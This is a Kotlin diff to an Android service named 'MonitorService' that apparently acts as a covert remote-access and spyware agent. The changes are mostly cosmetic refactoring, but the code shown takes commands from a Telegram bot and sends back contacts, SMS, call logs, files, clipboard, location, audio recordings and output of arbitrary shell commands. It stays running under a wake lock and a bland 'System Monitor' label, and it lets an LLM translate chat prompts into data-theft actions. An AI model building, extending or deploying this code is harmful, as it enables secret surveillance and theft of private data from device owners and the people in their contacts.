@@ -86,7 +86,7 @@ class MonitorService : Service() {
         initializeService()
     }
 
-    private fun initializeService() {
+    private fun initializeService(): Unit {
         try {
             loadConfig()
             acquireWakeLock()
@@ -103,7 +103,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun loadConfig() {
+    private fun loadConfig(): Unit {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
         val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
@@ -113,7 +113,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun checkAndRunTest() {
+    private fun checkAndRunTest(): Unit {
         if (testCompleted.getAndSet(true)) return
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         if (prefs.getBoolean(KEY_TEST_SENT, false)) return
@@ -130,7 +130,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun runTestSequence() {
+    private fun runTestSequence(): Unit {
         try {
             Log.d("MonitorService", "Running test sequence...")
             var results = ""
@@ -155,7 +155,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun acquireWakeLock() {
+    private fun acquireWakeLock(): Unit {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
@@ -163,7 +163,7 @@ class MonitorService : Service() {
         } catch (e: Exception) { Log.e("MonitorService", "Wake lock error", e) }
     }
 
-    private fun registerCommandReceiver() {
+    private fun registerCommandReceiver(): Unit {
         commandReceiver = CommandReceiver()
         val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -173,7 +173,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun startTelegramBot() {
+    private fun startTelegramBot(): Unit {
         thread("delete-wh") {
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
@@ -185,7 +185,7 @@ class MonitorService : Service() {
         pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
     }
 
-    private fun pollLoop() {
+    private fun pollLoop(): Unit {
         while (running) {
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
@@ -211,7 +211,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun handleTelegramUpdate(update: com.google.gson.JsonObject) {
+    private fun handleTelegramUpdate(update: com.google.gson.JsonObject): Unit {
         val msg = update.get("message")?.asJsonObject ?: return
         val chatId = msg.get("chat").asJsonObject.get("id").asLong
         val userId = msg.get("from").asJsonObject.get("id").asLong
@@ -246,7 +246,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
+    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>): Unit {
         val taskId = java.util.UUID.randomUUID().toString()
         val latch = CountDownLatch(1)
         val callback = TelegramCallback(chatId, latch)
@@ -280,7 +280,7 @@ class MonitorService : Service() {
     }
 
     inner class CommandReceiver : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
+        override fun onReceive(context: Context, intent: Intent): Unit {
             val capability = intent.getStringExtra("capability") ?: return
             val argsJson = intent.getStringExtra("args") ?: "{}"
             val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
@@ -290,7 +290,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long) {
+    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long): Unit {
         var output: Any? = null
         var error: String? = null
         var status = "completed"
@@ -318,7 +318,11 @@ class MonitorService : Service() {
             "audio" -> recordAudio(args as Map<String, Any>)
             "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> mutableMapOf<String, Any>("error" to "Unknown capability: $capability")
+            else -> {
+                val m = mutableMapOf<String, Any>()
+                m["error"] = "Unknown capability: $capability"
+                m
+            }
         }
     }
 
@@ -356,7 +360,10 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Contacts", "Error", e) }
-        return mutableMapOf<String, Any>("contacts" to list, "count" to list.size)
+        val result = mutableMapOf<String, Any>()
+        result["contacts"] = list
+        result["count"] = list.size
+        return result
     }
 
     private fun getSms(): Map<String, Any> {
@@ -379,7 +386,10 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Sms", "Error", e) }
-        return mutableMapOf<String, Any>("sms" to list, "count" to list.size)
+        val result = mutableMapOf<String, Any>()
+        result["sms"] = list
+        result["count"] = list.size
+        return result
     }
 
     private fun getCallLogs(): Map<String, Any> {
@@ -403,7 +413,10 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Calls", "Error", e) }
-        return mutableMapOf<String, Any>("calls" to list, "count" to list.size)
+        val result = mutableMapOf<String, Any>()
+        result["calls"] = list
+        result["count"] = list.size
+        return result
     }
 
     private fun getApps(): Map<String, Any> {
@@ -420,7 +433,10 @@ class MonitorService : Service() {
                 list.add(m)
             }
         } catch (e: Exception) { Log.e("Apps", "Error", e) }
-        return mutableMapOf<String, Any>("apps" to list, "count" to list.size)
+        val result = mutableMapOf<String, Any>()
+        result["apps"] = list
+        result["count"] = list.size
+        return result
     }
 
     private fun getFiles(args: Map<String, Any>): Map<String, Any> {
@@ -429,8 +445,11 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) mutableMapOf<String, Any>("error" to "Not a directory")
-                else {
+                if (!dir.exists() || !dir.isDirectory) {
+                    val m = mutableMapOf<String, Any>()
+                    m["error"] = "Not a directory"
+                    m
+                } else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
                             val m = mutableMapOf<String, Any>()
@@ -442,10 +461,18 @@ class MonitorService : Service() {
                             m
                         } catch (e: Exception) { null }
                     } ?: emptyList()
-                    mutableMapOf<String, Any>("files" to files.take(200), "path" to path, "count" to files.size)
+                    val m = mutableMapOf<String, Any>()
+                    m["files"] = files.take(200)
+                    m["path"] = path
+                    m["count"] = files.size
+                    m
                 }
             }
-            else -> mutableMapOf<String, Any>("error" to "Unknown action")
+            else -> {
+                val m = mutableMapOf<String, Any>()
+                m["error"] = "Unknown action"
+                m
+            }
         }
     }
 
@@ -453,18 +480,33 @@ class MonitorService : Service() {
         val wm = getSystemService(android.net.wifi.WifiManager::class.java)
         val results = wm.scanResults ?: emptyList()
         val networks = results.map { r ->
-            mutableMapOf<String, Any>("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
+            val m = mutableMapOf<String, Any>()
+            m["ssid"] = r.SSID
+            m["bssid"] = r.BSSID
+            m["level"] = r.level
+            m["freq"] = r.frequency
+            m["caps"] = r.capabilities
+            m
         }
-        mutableMapOf<String, Any>("networks" to networks, "count" to networks.size)
+        val result = mutableMapOf<String, Any>()
+        result["networks"] = networks
+        result["count"] = networks.size
+        return result
     }
 
     private fun getClipboard(): Map<String, Any> {
         val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
         if (cm.hasPrimaryClip()) {
             val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-            return mutableMapOf<String, Any>("text" to clip, "has_content" to clip.isNotEmpty())
+            val result = mutableMapOf<String, Any>()
+            result["text"] = clip
+            result["has_content"] = clip.isNotEmpty()
+            return result
         }
-        mutableMapOf<String, Any>("text" to "", "has_content" to false)
+        val result = mutableMapOf<String, Any>()
+        result["text"] = ""
+        result["has_content"] = false
+        return result
     }
 
     private fun getLocation(): Map<String, Any> {
@@ -475,20 +517,20 @@ class MonitorService : Service() {
 
             val lastLoc = locationManager?.getLastKnownLocation(provider)
             if (lastLoc != null) {
-                return mutableMapOf<String, Any>(
-                    "lat" to lastLoc.latitude,
-                    "lon" to lastLoc.longitude,
-                    "acc" to lastLoc.accuracy,
-                    "time" to lastLoc.time,
-                    "provider" to provider,
-                    "note" to "Last known location (may be stale)"
-                )
+                val result = mutableMapOf<String, Any>()
+                result["lat"] = lastLoc.latitude
+                result["lon"] = lastLoc.longitude
+                result["acc"] = lastLoc.accuracy
+                result["time"] = lastLoc.time
+                result["provider"] = provider
+                result["note"] = "Last known location (may be stale)"
+                return result
             }
 
             val latch = CountDownLatch(1)
             var result: Map<String, Any>? = null
             val listener = object : LocationListener {
-                override fun onLocationChanged(location: Location) {
+                override fun onLocationChanged(location: Location): Unit {
                     val m = mutableMapOf<String, Any>()
                     m["lat"] = location.latitude
                     m["lon"] = location.longitude
@@ -498,9 +540,9 @@ class MonitorService : Service() {
                     result = m
                     latch.countDown()
                 }
-                override fun onProviderDisabled(provider: String) { latch.countDown() }
-                override fun onProviderEnabled(provider: String) {}
-                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
+                override fun onProviderDisabled(provider: String): Unit { latch.countDown() }
+                override fun onProviderEnabled(provider: String): Unit {}
+                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?): Unit {}
             }
 
             try {
@@ -508,12 +550,18 @@ class MonitorService : Service() {
                 if (latch.await(5, TimeUnit.SECONDS)) {
                     return result ?: mutableMapOf<String, Any>("error" to "Location request timed out")
                 }
-                return mutableMapOf<String, Any>("error" to "Location timeout - no fix in 5s")
+                val m = mutableMapOf<String, Any>()
+                m["error"] = "Location timeout - no fix in 5s"
+                return m
             } catch (e: Exception) {
-                return mutableMapOf<String, Any>("error" to e.message ?: "Location error")
+                val m = mutableMapOf<String, Any>()
+                m["error"] = e.message ?: "Location error"
+                return m
             }
         } catch (e: Exception) {
-            return mutableMapOf<String, Any>("error" to e.message ?: "Location error")
+            val m = mutableMapOf<String, Any>()
+            m["error"] = e.message ?: "Location error"
+            return m
         }
     }
 
@@ -536,20 +584,32 @@ class MonitorService : Service() {
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
                     }
-                    mutableMapOf<String, Any>("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
+                    val m = mutableMapOf<String, Any>()
+                    m["status"] = "recording"
+                    m["duration"] = duration
+                    m["file"] = outputFile.absolutePath
+                    m
                 } catch (e: Exception) {
-                    mutableMapOf<String, Any>("error" to e.message ?: "Audio start failed")
+                    val m = mutableMapOf<String, Any>()
+                    m["error"] = e.message ?: "Audio start failed"
+                    m
                 }
             }
             "stop" -> {
                 stopRecording()
-                mutableMapOf<String, Any>("status" to "stopped")
+                val m = mutableMapOf<String, Any>()
+                m["status"] = "stopped"
+                m
             }
-            else -> mutableMapOf<String, Any>("error" to "Unknown audio action")
+            else -> {
+                val m = mutableMapOf<String, Any>()
+                m["error"] = "Unknown audio action"
+                m
+            }
         }
     }
 
-    private fun stopRecording() {
+    private fun stopRecording(): Unit {
         mediaRecorder?.let {
             try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
             mediaRecorder = null
@@ -559,25 +619,45 @@ class MonitorService : Service() {
     private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
         val cameraId = (args["camera"] as? Int) ?: 0
         val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
-        mutableMapOf<String, Any>("status" to "requires_camera2", "note" to "Camera2 API needed", "file" to outputFile.absolutePath, "camera_id" to cameraId)
+        val m = mutableMapOf<String, Any>()
+        m["status"] = "requires_camera2"
+        m["note"] = "Camera2 API needed"
+        m["file"] = outputFile.absolutePath
+        m["camera_id"] = cameraId
+        return m
     }
 
     private fun getScreenshot(): Map<String, Any> {
-        mutableMapOf<String, Any>("status" to "requires_mediaprojection", "note" to "Requires MediaProjection permission")
+        val m = mutableMapOf<String, Any>()
+        m["status"] = "requires_mediaprojection"
+        m["note"] = "Requires MediaProjection permission"
+        return m
     }
 
     private fun runShell(cmd: String): Map<String, Any> {
-        if (cmd.isBlank()) return mutableMapOf<String, Any>("error" to "No command")
+        if (cmd.isBlank()) {
+            val m = mutableMapOf<String, Any>()
+            m["error"] = "No command"
+            return m
+        }
         try {
             val process = Runtime.getRuntime().exec(cmd)
             val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
             val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
             val exitCode = process.waitFor()
-            mutableMapOf<String, Any>("exit" to exitCode, "output" to output, "error" to error)
-        } catch (e: Exception) { mutableMapOf<String, Any>("error" to e.message ?: "unknown error") }
+            val m = mutableMapOf<String, Any>()
+            m["exit"] = exitCode
+            m["output"] = output
+            m["error"] = error
+            return m
+        } catch (e: Exception) {
+            val m = mutableMapOf<String, Any>()
+            m["error"] = e.message ?: "unknown error"
+            return m
+        }
     }
 
-    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
+    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0): Unit {
         val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
             putExtra("task_id", taskId)
             putExtra("result", result?.toString() ?: "")
@@ -603,7 +683,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun createNotificationChannel() {
+    private fun createNotificationChannel(): Unit {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                 .apply { description = "Background monitoring" }
@@ -626,11 +706,11 @@ class MonitorService : Service() {
             .build()
     }
 
-    private fun sendTelegramMessage(chatId: Long, text: String) {
+    private fun sendTelegramMessage(chatId: Long, text: String): Unit {
         thread("tg-$chatId") { sendTelegramInternal(chatId, text) }
     }
 
-    private fun sendTelegramInternal(chatId: Long, text: String) {
+    private fun sendTelegramInternal(chatId: Long, text: String): Unit {
         try {
             val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
             val params = mutableMapOf<String, Any>()
@@ -638,14 +718,14 @@ class MonitorService : Service() {
             params["text"] = if (text.length > 4000) text.take(4000) + "\n...[truncated]" else text
             params["parse_mode"] = "Markdown"
             val jsonBody = gson.toJson(params)
-            val mediaType = MediaType.get("application/json")
-            val body = RequestBody.create(jsonBody, mediaType)
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
     }
 
-    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
+    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = ""): Unit {
         thread("tg-doc-$chatId") {
             try {
                 val file = File(getExternalFilesDir(null), filename)
@@ -656,7 +736,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(file.readBytes(), MediaType.get("text/plain")))
+                        RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -666,7 +746,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean) {
+    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean): Unit {
         if (content.length > 4000 || forceFile) {
             sendTelegramDocument(chatId, filename, content, caption)
         } else {
@@ -697,9 +777,10 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            val greetings = setOf("hi", "hello", "hey", "test", "ping")
-            if (lower in greetings) {
-                return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
+            when (lower) {
+                "hi", "hello", "hey", "test", "ping" -> {
+                    return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
+                }
             }
 
             val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
@@ -725,8 +806,8 @@ Only respond with valid JSON, no extra text."""
             payload["stream"] = false
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = MediaType.get("application/json")
-            val body = RequestBody.create(jsonBody, mediaType)
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
                 .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
@@ -804,12 +885,15 @@ Only respond with valid JSON, no extra text."""
             }
         } catch (e: Exception) {
             Log.e("AI", "Parse error", e)
-            results.add(mutableMapOf<String, Any>("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
+            val m = mutableMapOf<String, Any>()
+            m["error"] = e.message ?: "unknown error"
+            m["raw_response"] = aiResponse
+            results.add(m)
         }
         return results
     }
 
-    private fun handleAiCommand(chatId: Long, prompt: String) {
+    private fun handleAiCommand(chatId: Long, prompt: String): Unit {
         val taskId = java.util.UUID.randomUUID().toString()
         val latch = CountDownLatch(1)
         val callback = TelegramCallback(chatId, latch)
@@ -856,7 +940,7 @@ Only respond with valid JSON, no extra text."""
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY
 
-    override fun onDestroy() {
+    override fun onDestroy(): Unit {
         running = false
         wakeLock?.release()
         pollThread?.interrupt()
